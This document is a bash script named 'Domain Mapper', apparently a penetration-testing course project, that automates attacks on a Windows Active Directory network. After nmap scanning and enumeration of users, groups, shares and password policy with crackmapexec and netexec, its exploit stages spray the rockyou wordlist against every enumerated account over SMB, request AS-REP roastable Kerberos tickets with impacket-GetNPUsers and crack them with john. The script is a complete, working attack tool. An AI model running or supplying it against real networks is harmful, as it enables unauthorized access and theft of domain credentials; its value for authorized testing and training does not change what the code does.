#!/bin/bash

#made by e d e n 
#############################################
#Color codes 
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
UNDERLINE='\033[4m'
LIGHT_BLUE='\033[1;36m'
NC='\033[0m' # no color
############################################

#opening interface 
echo -e "${LIGHT_BLUE}###################################################${NC}"
echo -e "${YELLOW}$(figlet 'Domain Mapper')${NC}"
echo -e "${LIGHT_BLUE}###################################################${NC}"



function toolcheck(){ #checking if the user has all the tools 
    # List of required tools
    
    echo -e "${YELLOW}Checking for required tools...${NC}"
    sleep 2 
    for tool in nmap crackmapexec netexec cowsay enscript ps2pdf impacket-GetNPUsers john #tool check 
    do
        check=$(command -v $tool)
        if [ -z "$check" ]
        then
            echo -e "${YELLOW}[${RED}✗${YELLOW}] $tool is NOT installed${NC}"
            echo -e "${RED}Installing missing tools${NC}"
       sudo apt-get update &> /dev/null #checking for system update 
       sudo apt-get install $tool -y &> /dev/null # missing tool install 
	    echo -e "${YELLOW}[${GREEN}✓${NC}${YELLOW}] $tool is installed${NC}"
        else
         echo -e "${YELLOW}[${GREEN}✓${NC}${YELLOW}] $tool is installed${NC}"
          fi
    done
}

function PREPARE
{
	
	read -p $'\e[1;33mEnter Network range for scanning: \e[0m'  netrange #getting the domain ip 
	read -p $'\e[1;33mEnter the Domain Controller name: \e[0m' domname #getting the domain name 
	read -p $'\e[1;33mEnter AD username (press enter to skip): \e[0m' aduser #domain user
	read -p $'\e[1;33mEnter AD password (press enter to skip): \e[0m' adpass #domain pass

	read -p $'\e[1;33mSpecify a name of a new folder to save all the data: \e[0m' folder #making a file for the data in the end 
	mkdir $folder

	#If the user press enter, the password list rock you will be saved in the variable
	read -p $'\e[1;33mSpecify the password list to use (press enter to default): \e[0m' paslist
	if [ -z "$paslist" ]
	then
		paslist='/usr/share/wordlists/rockyou.txt' #passlist will use rockyou if user didnt give 1 
	fi
}


function SCAN()
{
	echo -e "${YELLOW}Choose scan type${NC}"
	
	echo -e "${YELLOW}B for basic scan, I for intermediate, A for advanced, N to skip ${NC}" #scan choice
	read scantype

	#The scan level will be determined by the user
	case $scantype in

		B|b)  	echo -e "${LIGHT_BLUE}"
              cowsay -f tux "Basic scanning :" #basic scan 
               echo -e "${NC}"
		     extra_flags=''
		;;

		I|i) 	echo -e "${LIGHT_BLUE}"
              cowsay -f tux "intermediate scanning :" #intermediate scan 
               echo -e "${NC}"
		        extra_flags='-p-'
		;;

		A|a) echo -e "${LIGHT_BLUE}"
              cowsay -f tux "advanced scanning :" #advanced scan 
               echo -e "${NC}"
		   extra_flags='-p- -sU'
		;;
        N|n) echo -e "${YELLOW}Skipping scan.${NC}" #skip option      
         return  #← stops here, won't hit the nmap line below
        ;;
        *) echo -e "${RED}Invaild option${NC}"
        SCAN
        ;;
		
	esac
	#scan the neterange variable with the extra flags if exists
	nmap $netrange -Pn $extra_flags > $folder/nmap_output.txt
}

function BasicEnum()
{
	cat $folder/nmap_output.txt | grep "report for" | awk '{print $NF}' > $folder/live_ips.txt #filtering only the ips
	
	#scaning all the ips 
	for ip in $(cat $folder/live_ips.txt)
	do
		nmap $ip -Pn -sV > $folder/$ip
	done

	
	DomainIP=$(grep -il 'kerberos' $folder/[0-9]* | awk -F '/' '{print $2}') #getting the domainip
	echo -e "${YELLOW}The Domain IP is $DomainIP${NC}"
    #shows the dchip of the domain 
	DHCPIP=$(nmap $DomainIP -sV --script=broadcast-dhcp-discover | grep "Server Identifier" | awk '{print $NF}')
	echo -e "${YELLOW}the DHCP server IP is $DHCPIP${NC}"
}

function InterEnum()
{
	nmap $DomainIP -sV --script=ldap-search,smb-enum-shares,smb-os-discovery,smb-enum-groups > $folder/domain_extended_scan.txt #scans the domain with nse scripts

	#For loop to find devices with the following ports
	for port in 21 22 445 5985 389 3389
	do
		
	echo -e  "${YELLOW}The following IPs has the port $port on${NC}" | tee -a $folder/open_key_ports.txt #tee -a will display the data and inject to the file

	cat $folder/nmap_output.txt | grep -i "$port\|report" | grep $port -B 1 | grep report | awk '{print $NF}' | tee -a $folder/open_key_ports.txt #showing the ips with open ports listed above
	echo -e "${YELLOW}--------------------------------------${NC}"
		
	done
}

function AdvEnum()
{
	if [ -z "$adpass" ]; #pass list check 
	then
		echo "Can't continue, AD creds are missing"
		
	else
	#run all the commands
	crackmapexec smb $DomainIP -u $aduser -p $adpass --groups 'Domain Admins' > $folder/adminusers.txt #gets the domain admin groups
	crackmapexec smb $DomainIP -u $aduser -p $adpass --users | grep -oP '(?<=\\)[^ ]+' > $folder/adusers.txt #gets the domain users 
	crackmapexec smb $DomainIP -u $aduser -p $adpass --groups > $folder/adgroups.txt #gets the domain groups
	crackmapexec smb $DomainIP -u $aduser -p $adpass --shares > $folder/adshares.txt #gets all the share folders
	crackmapexec smb $DomainIP -u $aduser -p $adpass --pass-pol > $folder/password_policy.txt #checking for password policy 
	#Disable unused?
    netexec ldap $DomainIP -u $aduser -p $adpass -d $domname --query "(userAccountControl:1.2.840.113556.1.4.803:=2)" sAMAccountName > $folder/disabled_users.txt
    #None expired users
	netexec ldap $DomainIP -u $aduser -p $adpass -d $domname --query "(|(accountExpires=0)(accountExpires=9223372036854775807))" sAMAccountName > $folder/never_expire_accounts.txt
fi
}


function ENUM()
{
	echo -e "${YELLOW}Choose Enumeration type${NC}"
	echo -e "${YELLOW}B for basic, I for intermediate, A for advanced, N to skip ${NC}" #enum choice
	read enumtype
	

	case $enumtype in

		B|b) echo -e "${RED}"
             cowsay -f daemon "Starting basic enum:" #basic enum
             echo -e "${NC}" 
		     BasicEnum
		;;

		I|i) 
		     echo -e "${RED}"
             cowsay -f daemon "Starting Intermediate enum:" #Intermediate enum 
             echo -e "${NC}" 
		     BasicEnum
			 InterEnum
		;;

		A|a) 
		     echo -e "${RED}"
             cowsay -f daemon "Starting Advanced enum:" #Advanced enum
             echo -e "${NC}" 
		     BasicEnum
			 InterEnum
			 AdvEnum
		;;
          N|n) echo -e "${YELLOW}Skipping enum.${NC}" #skip option          
        ;;
         *) ENUM
	    ;;
	
	esac
}

function EXPLOIT()
{
     # Check if DomainIP exists
       if [ -z "$DomainIP" ]; then
           echo -e "${RED}Domain IP not found. Please run enumeration first.${NC}"
           return
       fi
    
    echo -e "${YELLOW}Choose Exploit type${NC}"
  echo -e "${YELLOW}B for basic Exploitation, I for intermediate, A for advanced, N to skip ${NC}" #exploit type choice 
  read exploittype </dev/tty

case $exploittype in

 B|b) 	echo -e "${LIGHT_BLUE}"
     cowsay -f hellokitty "Starting basic Exploit:" #basic exploit
      echo -e "${NC}"
  nmap $DomainIP -sV --script=vuln > $folder/domain-vulns.txt #this command wil be executed in every stage

 ;;

 I|i)
       echo -e "${LIGHT_BLUE}"
     cowsay -f hellokitty "Starting intermediate Exploit:" #intermidate expliot
      echo -e "${NC}" 
 
 nmap $DomainIP -sV --script=vuln > $folder/domain-vulns.txt #this command wil be executed in every stage
 if [ -f "$folder/adusers.txt" ] #This is a file that was created in the Advanced enumeration
 # if the users file exist, start the attack
 then

 crackmapexec smb $DomainIP -u $folder/adusers.txt -p $paslist -d $domname --continue-on-success | grep '+' >> $folder/pas-attack_results.txt #brute forceing the users 

 else
 echo -e "${RED}No User file was found${NC}"

fi
 ;;
 
A|a) 
    echo -e "${LIGHT_BLUE}"
     cowsay -f hellokitty "Starting advanced Exploit:" #advanced expliot
      echo -e "${NC}" 
nmap $DomainIP -sV --script=vuln > $folder/domain-vulns.txt #this command wil be executed in every stage
if [ -f "$folder/adusers.txt" ]
# if the users file exist, start the attack
then
crackmapexec smb $DomainIP -u $folder/adusers.txt -p $paslist -d $domname --continue-on-success | grep '+' >> $folder/pas-attack_results.txt
#get the list of nusers, crack the tickets using john
impacket-GetNPUsers $domname/ -usersfile $folder/adusers.txt -dc-ip $DomainIP > $folder/npusers_tickets.txt
john $folder/npusers_tickets.txt --format=krb5asrep --wordlist=$paslist &>/dev/null 
john $folder/npusers_tickets.txt --format=krb5asrep --show > $folder/cracked_npusers.txt

if grep -q "^0 password hashes cracked" "$folder/cracked_npusers.txt" #checking if john managed to crack any passwords
then
     echo -e "${RED}Didn't manage to brute force the hashes${NC}"
else
    echo -e "${GREEN}Successfully cracked some hashes! Check cracked_npusers.txt${NC}"
   
fi

else
echo -e "${RED}No User file was found${NC}" # checking if user file is live
fi
;;
 N|n) echo -e "${YELLOW}Skipping expliot.${NC}" #skip option 
;;

esac



}






function PDF()
{
	#Take all the important files, and merge them to 1
	

	
	cat $folder/* > $folder/allfile.txt #making a one big file 
	enscript $folder/allfile.txt -p $folder/output &>/dev/null
	ps2pdf $folder/output $folder/output.pdf &>/dev/null 
	echo -e "${GREEN}pdf file created name output.pdf in the $folder directory${NC}"
	rm $folder/output
	rm $folder/allfile.txt
}

toolcheck
echo ""
PREPARE
echo ""
SCAN
echo ""
ENUM
echo ""
EXPLOIT
PDF
